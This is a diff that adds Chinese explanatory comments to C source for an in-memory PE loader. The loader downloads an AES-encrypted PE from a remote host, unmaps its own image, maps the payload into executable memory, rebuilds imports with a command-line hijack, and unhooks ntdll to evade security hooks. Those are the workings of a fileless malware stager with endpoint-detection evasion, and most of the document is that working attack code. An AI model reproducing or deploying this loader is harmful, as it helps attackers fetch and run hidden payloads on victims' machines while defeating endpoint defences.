@@ -368,7 +368,7 @@ char* GetNTHeaders(char* pe_buffer)
     return (char*)inh;
 }
 
-// 获取各表的RVA地址
+// 通过PE文件首地址和表的偏移获取RVA
 IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
 {
     if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
@@ -379,7 +379,7 @@ IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
     IMAGE_DATA_DIRECTORY* peDir = NULL;
 
     IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
-    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]); // 各表RVA及大小
+    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]); // 各表RVA及大小 0 为导出表 1为导入表
 
     if (peDir->VirtualAddress == NULL) {
         return NULL;
@@ -387,26 +387,31 @@ IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
     return peDir;
 }
 
+// 输入一个PE文件的首地址，并把所需要的dll加载到IAT中
 bool RepairIAT(PVOID modulePtr)
 {
+    // 获取导入表
     IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
     if (importsDir == NULL) return false;
 
-    size_t maxSize = importsDir->Size;  // 数据块的长度
-    size_t impAddr = importsDir->VirtualAddress;  // 数据块的起始位置
+    size_t maxSize = importsDir->Size;  // 导入表的长度
+    size_t impAddr = importsDir->VirtualAddress;  // 导入表的起始位置
 
     IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
     size_t parsedSize = 0;
 
     for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
+        // 获取libname的 VA 地址
         lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
+        
 
         if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
+        // 获取到导入dll的名字
         LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
 
-        size_t call_via = lib_desc->FirstThunk;
-        size_t thunk_addr = lib_desc->OriginalFirstThunk;
-        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;
+        size_t call_via = lib_desc->FirstThunk;  // IAT
+        size_t thunk_addr = lib_desc->OriginalFirstThunk;  // INT
+        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;  
 
         size_t offsetField = 0;
         size_t offsetThunk = 0;
@@ -417,18 +422,18 @@ bool RepairIAT(PVOID modulePtr)
 
             if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
             {
-                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
-                fieldThunk->u1.Function = addr;
+                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址
+                fieldThunk->u1.Function = addr;  // 获取到的地址赋值给IAT
             }
 
             if (fieldThunk->u1.Function == NULL) break;
 
-            if (fieldThunk->u1.Function == orginThunk->u1.Function) {
+            if (fieldThunk->u1.Function == orginThunk->u1.Function) {  // 如果相等说明没有发生重定向
 
-                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);
+                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);  
                 LPSTR func_name = (LPSTR)by_name->Name;
 
-                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
+                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name); //通过INT里的函数名获取函数地址
 
 
                 if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
@@ -478,30 +483,32 @@ bool RepairIAT(PVOID modulePtr)
     return true;
 }
 
+// 加载PE文件 把date文件加载到内存中
 void PELoader(char* data, DWORD datasize)
 {
 
     masqueradeCmdline();
 
     unsigned int chksum = 0;
-    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };
+    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; }; // 校验码
 
     BYTE* pImageBase = NULL;
     LPVOID preferAddr = 0;
     DWORD OldProtect = 0;
-
+    // 获取NT头
     IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
     if (!ntHeader) {
         exit(0);
     }
 
     IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
-    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 程序装载地址
+    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件首地址
 
 
     HMODULE dll = LoadLibraryA("ntdll.dll");
+    // 强制卸载
     ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
-
+    // 根据PE文件加载到内存占用的总大小申请内存
     pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!pImageBase) {
         if (!relocDir) {
@@ -517,10 +524,14 @@ void PELoader(char* data, DWORD datasize)
     }
 
     // FILL the memory block with PEdata
-    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
-    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
 
+    // 将镜像基址赋值到pe文件头
+    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
+    // 将文件头拷贝到内存中
+    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
+    // 文件头的节
     IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
+    // 依次通过节数把文件中的数据拷贝到内存中
     for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
     {
         memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
@@ -578,7 +589,7 @@ LPVOID getNtdll() {
 
 
 
-
+// 脱钩ntdll
 BOOL Unhook(LPVOID cleanNtdll) {
 
     char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };
@@ -659,6 +670,7 @@ int main(int argc, char** argv) {
 
 
     printf("\n\n[+] Get AES Encrypted PE from %s:%d\n", host, port);
+    // 获取一个加密的PE文件
     DATA PE = GetData(whost, port, wpe);
     if (!PE.data) {
         printf("[-] Failed in getting AES Encrypted PE\n");
